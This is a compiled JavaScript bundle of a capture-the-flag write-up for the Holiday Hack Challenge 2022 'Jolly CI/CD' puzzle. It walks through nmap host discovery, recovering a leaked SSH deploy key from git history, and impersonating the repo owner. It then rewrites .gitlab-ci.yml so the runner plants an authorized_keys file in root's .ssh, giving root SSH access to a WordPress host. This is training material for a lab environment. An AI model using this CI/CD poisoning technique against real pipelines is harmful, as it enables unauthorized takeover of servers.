"use strict";(self.webpackChunkhhc_2022=self.webpackChunkhhc_2022||[]).push([[73],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>m});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},d=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},p="mdxType",h={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,d=i(e,["components","mdxType","originalType","parentName"]),p=c(t),u=o,m=p["".concat(l,".").concat(u)]||p[u]||h[u]||a;return t?r.createElement(m,s(s({ref:n},d),{},{components:t})):r.createElement(m,s({ref:n},d))}));function m(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,s=new Array(a);s[0]=u;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[p]="string"==typeof e?e:o,s[1]=i;for(var c=2;c<a;c++)s[c]=t[c];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},5584:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>p,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var r=t(7462),o=(t(7294),t(3905));const a={sidebar_position:3},s="Jolly CI/CD",i={unversionedId:"hhc2022/elfen_ring/jolly_cicd",id:"hhc2022/elfen_ring/jolly_cicd",title:"Jolly CI/CD",description:"Challenge",source:"@site/docs/hhc2022/elfen_ring/jolly_cicd.md",sourceDirName:"hhc2022/elfen_ring",slug:"/hhc2022/elfen_ring/jolly_cicd",permalink:"/hhc2022/docs/hhc2022/elfen_ring/jolly_cicd",draft:!1,tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"tutorialSidebar",previous:{title:"Prison Escape",permalink:"/hhc2022/docs/hhc2022/elfen_ring/prison_escape"},next:{title:"The Web Ring",permalink:"/hhc2022/docs/hhc2022/web_ring/"}},l={},c=[{value:"Challenge",id:"challenge",level:3},{value:"Answer",id:"answer",level:3}],d={toc:c};function p(e){let{components:n,...a}=e;return(0,o.kt)("wrapper",(0,r.Z)({},d,a,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"jolly-cicd"},"Jolly CI/CD"),(0,o.kt)("h3",{id:"challenge"},"Challenge"),(0,o.kt)("admonition",{title:"Challenge Text",type:"info"},(0,o.kt)("p",{parentName:"admonition"},(0,o.kt)("em",{parentName:"p"},"Difficulty:")," \u2605\u2605\u2605\u2605\u2605"),(0,o.kt)("p",{parentName:"admonition"},"Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.")),(0,o.kt)("h3",{id:"answer"},"Answer"),(0,o.kt)("p",null,"Hm... That's not a very descriptive prompt. Since we're still feeling the rush from escaping from a container in the last challenge, let's see if we can escape this one too:"),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"Current container&#39;s capabilities",src:t(3702).Z,width:"1252",height:"332"})),(0,o.kt)("p",null,"We're not exactly container escape experts, but these permissions look pretty locked down. We'll try to pull another thread."),(0,o.kt)("hr",null),(0,o.kt)("p",null,"Before we started this, we overheard the following hint:"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"WHOOPS! I didn't mean to commit that to ",(0,o.kt)("a",{parentName:"p",href:"http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git"},"http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git"),"..."),(0,o.kt)("ul",{parentName:"blockquote"},(0,o.kt)("li",{parentName:"ul"},"Tinsel Upatree, 2022 CE, moments before being fired from the North Pole IT department"))),(0,o.kt)("p",null,"It seems that if we can get access to this mistaken commit, maybe we'll find something that will be useful to us. We'll start by checking to see if our host knows where this Gitlab host might be."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~$ cat /etc/hosts\n127.0.0.1       localhost\n::1     localhost ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n172.18.0.99     grinchum-land.flag.net.internal grinchum-land\n")),(0,o.kt)("p",null,"We don't have the exact IP, but it does look like we are at least on the same network. Using ",(0,o.kt)("inlineCode",{parentName:"p"},"nmap")," (which is very fortunately installed on this host), we'll check to see if we can find any more hosts on ",(0,o.kt)("inlineCode",{parentName:"p"},"172.18.0.0/24"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:/run# nmap -sP 172.18.0.0/24\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-12-29 04:27 GMT\nNmap scan report for 172.18.0.1\nHost is up (0.000073s latency).\nMAC Address: 02:42:2A:58:71:F6 (Unknown)\nNmap scan report for wordpress-db.local_docker_network (172.18.0.87)\nHost is up (0.000041s latency).\nMAC Address: 02:42:AC:12:00:57 (Unknown)\nNmap scan report for wordpress.local_docker_network (172.18.0.88)\nHost is up (0.000029s latency).\nMAC Address: 02:42:AC:12:00:58 (Unknown)\nNmap scan report for gitlab.local_docker_network (172.18.0.150)\nHost is up (0.000041s latency).\nMAC Address: 02:42:AC:12:00:96 (Unknown)\nNmap scan report for grinchum-land.flag.net.internal (172.18.0.99)\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 1.82 seconds\n")),(0,o.kt)("p",null,"Bingo! And it looks like we had DNS all along \ud83e\udd26... These hosts all look interesting, but we'll start by seeing if we can clone this repo we're looking for:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git\nCloning into 'wordpress.flag.net.internal'...\nremote: Enumerating objects: 10195, done.\nremote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195\nReceiving objects: 100% (10195/10195), 36.49 MiB | 25.79 MiB/s, done.\nResolving deltas: 100% (1799/1799), done.\nUpdating files: 100% (9320/9320), done.\n")),(0,o.kt)("p",null,"Without a hitch, we now have the repo. Let's look through the commit history with ",(0,o.kt)("inlineCode",{parentName:"p"},"git log")," to try and find the mistaken commit"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~$ cd wordpress.flag.net.internal\ngrinchum-land:~/wordpress.flag.net.internal$ git log\ncommit 37b5d575bf81878934adb937a4fff0d32a8da105 (HEAD -> main, origin/main, origin/HEAD)\nAuthor: knee-oh <sporx@kringlecon.com>\nDate:   Wed Oct 26 13:58:15 2022 -0700\n\n    updated wp-config\n\n...\n\ncommit e2208e4bae4d41d939ef21885f13ea8286b24f05\nAuthor: knee-oh <sporx@kringlecon.com>\nDate:   Tue Oct 25 13:43:53 2022 -0700\n\n    big update\n\ncommit e19f653bde9ea3de6af21a587e41e7a909db1ca5\nAuthor: knee-oh <sporx@kringlecon.com>\nDate:   Tue Oct 25 13:42:54 2022 -0700\n\n    whoops\n\ncommit abdea0ebb21b156c01f7533cea3b895c26198c98\nAuthor: knee-oh <sporx@kringlecon.com>\nDate:   Tue Oct 25 13:42:13 2022 -0700\n\n    added assets\n\u2026\n")),(0,o.kt)("p",null,"A few commits down, we can see that commit ID ",(0,o.kt)("inlineCode",{parentName:"p"},"e19f653bde9ea3de6af21a587e41e7a909db1ca5"),' has a commit message of "whoops". That\'s almost definitely our culprit. If the "whoops" commit is where knee-oh realized their mistake, let\'s check out the commit before it and see if we can find something.'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal$ git checkout abdea0ebb21b156c01f7533cea3b895c26198c98\n...\ngrinchum-land:~/wordpress.flag.net.internal$ ls -la\ntotal 48\ndrwxr-xr-x 5 samways users  4096 Jan  7 01:56 .\ndrwxr-xr-x 1 samways  1002  4096 Jan  7 01:52 ..\ndrwxr-xr-x 8 samways users  4096 Jan  7 01:56 .git\ndrwxr-xr-x 2 samways users  4096 Jan  7 01:56 .ssh\n-rw-r--r-- 1 samways users 19915 Jan  7 01:52 license.txt\n-rw-r--r-- 1 samways users  7401 Jan  7 01:52 readme.html\ndrwxr-xr-x 6 samways users  4096 Jan  7 01:52 wp-content\n")),(0,o.kt)("p",null,"If we needed to, we could have compared this revision to the one after it to see what changed, but since we've spotted a ",(0,o.kt)("inlineCode",{parentName:"p"},".ssh")," directory in this folder, there's really no need."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal$ cd .ssh/\ngrinchum-land:~/wordpress.flag.net.internal/.ssh$ ls -la\ntotal 16\ndrwxr-xr-x 2 samways users 4096 Jan  7 01:56 .\ndrwxr-xr-x 5 samways users 4096 Jan  7 01:56 ..\n-rw-r--r-- 1 samways users  411 Jan  7 01:56 .deploy\n-rw-r--r-- 1 samways users  102 Jan  7 01:56 .deploy.pub\ngrinchum-land:~/wordpress.flag.net.internal/.ssh$ cat .deploy.pub \nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com\n")),(0,o.kt)("p",null,"We'll add these SSH keys to our own ",(0,o.kt)("inlineCode",{parentName:"p"},".ssh")," directory for simplicity's sake:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal/.ssh$ mkdir ~/.ssh\ngrinchum-land:~/wordpress.flag.net.internal/.ssh$ mv .deploy.pub ~/.ssh/id_ed25519.pub\ngrinchum-land:~/wordpress.flag.net.internal/.ssh$ mv .deploy ~/.ssh/id_ed25519\ngrinchum-land:~/wordpress.flag.net.internal/.ssh$ chmod 600 ~/.ssh/*\n")),(0,o.kt)("p",null,'At this point, there\'s several ways to attempt to use this SSH cert (believe us, we tried), but only one will work: we can use these keys to authenticate to the Gitlab server as "knee-oh", the owner of the repo!'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal/.ssh$ ssh git@gitlab\nThe authenticity of host 'gitlab (172.18.0.150)' can't be established.\nED25519 key fingerprint is SHA256:jW9axa8onAWH+31D5iHA2BYliy2AfsFNaqomfCzb2vg.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'gitlab' (ED25519) to the list of known hosts.\nPTY allocation request failed on channel 0\nWelcome to GitLab, @knee-oh!\nConnection to gitlab closed.\n")),(0,o.kt)("p",null,"Since the Gitlab server thinks we're knee-oh, we can now set the repository's remote URL to use SSH instead of HTTP. Or, if you're as brutish as we are, just delete it and check it out again:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal$ cd ..\ngrinchum-land:~$ rm -rf wordpress.flag.net.internal/\ngrinchum-land:~$ git clone git@gitlab:rings-of-powder/wordpress.flag.net.internal.git\nCloning into 'wordpress.flag.net.internal'...\nremote: Enumerating objects: 10195, done.\nremote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195\nReceiving objects: 100% (10195/10195), 36.49 MiB | 21.74 MiB/s, done.\nResolving deltas: 100% (1799/1799), done.\nUpdating files: 100% (9320/9320), done.\n")),(0,o.kt)("p",null,"We're nearing the end here, but the main thing that we need to consider next is how to get the CI/CD runner agent to set up the host so that we can access it. We can see what the runner currently does by examining the repo's CI/CD configuration - ",(0,o.kt)("inlineCode",{parentName:"p"},".gitlab-ci.yml"),". This file is located in the root of the repository:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml \nstages:\n  - deploy\n\ndeploy-job:      \n  stage: deploy \n  environment: production\n  script:\n    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html\n')),(0,o.kt)("p",null,"What exists currently is a simple rsync command that copies the full contents of this repository to ",(0,o.kt)("inlineCode",{parentName:"p"},"root@wordpress.flag.net.internal:/var/www/html"),". Since we already have an SSH key, why don't we use that to get onto the Wordpress host? Since we'll need to trust the key, we make a file in the root of the repository named ",(0,o.kt)("a",{parentName:"p",href:"https://www.ssh.com/academy/ssh/authorized-keys-file"},(0,o.kt)("inlineCode",{parentName:"a"},"authorized_keys"))," and load it with our SSH identity's public key:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal$ cat ~/.ssh/id_ed25519.pub > authorized_keys\n")),(0,o.kt)("p",null,"Once we've done that, we'll update the rsync command to copy it over to where we need it in root's ",(0,o.kt)("inlineCode",{parentName:"p"},".ssh")," directory. We'll modify the runner script to the following:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'- rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" -atv --delete --progress ./authorized_keys root@wordpress.flag.net.internal:/root/.ssh/\n')),(0,o.kt)("p",null,"Once all this is saved, we're ready to commit our changes and push them so that the CI/CD runner can (hopefully) let us into the Wordpress server."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email sprox@kriglecon.com\ngrinchum-land:~/wordpress.flag.net.internal$ git config --global user.name knee-oh\ngrinchum-land:~/wordpress.flag.net.internal$ git commit -a -m "whoops * 2"\n[main 828689f] whoops * 2\n 1 file changed, 2 insertions(+), 1 deletion(-)\ngrinchum-land:~/wordpress.flag.net.internal$ git push origin main\nEnumerating objects: 5, done.\nCounting objects: 100% (5/5), done.\nDelta compression using up to 2 threads\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 327 bytes | 327.00 KiB/s, done.\nTotal 3 (delta 2), reused 0 (delta 0), pack-reused 0\nTo gitlab:rings-of-powder/wordpress.flag.net.internal.git\n   37b5d57..828689f  main -> main\n')),(0,o.kt)("p",null,"Now, the moment of truth. We'll try to SSH to the Wordpress server as root."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~/wordpress.flag.net.internal$ ssh root@wordpress\nLinux wordpress.flag.net.internal 5.10.51 #1 SMP Mon Jul 19 19:08:01 UTC 2021 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nroot@wordpress:~# \n")),(0,o.kt)("p",null,"We're in! All that's left is to cat the flag at ",(0,o.kt)("inlineCode",{parentName:"p"},"/flag.txt")," to find some great ASCII art and our answer, which is ",(0,o.kt)("strong",{parentName:"p"},(0,o.kt)("inlineCode",{parentName:"strong"},"oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT")),"."))}p.isMDXComponent=!0},3702:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/er2-1-dbcc58c86e740e1a6e33d4610caf4b83.png"}}]);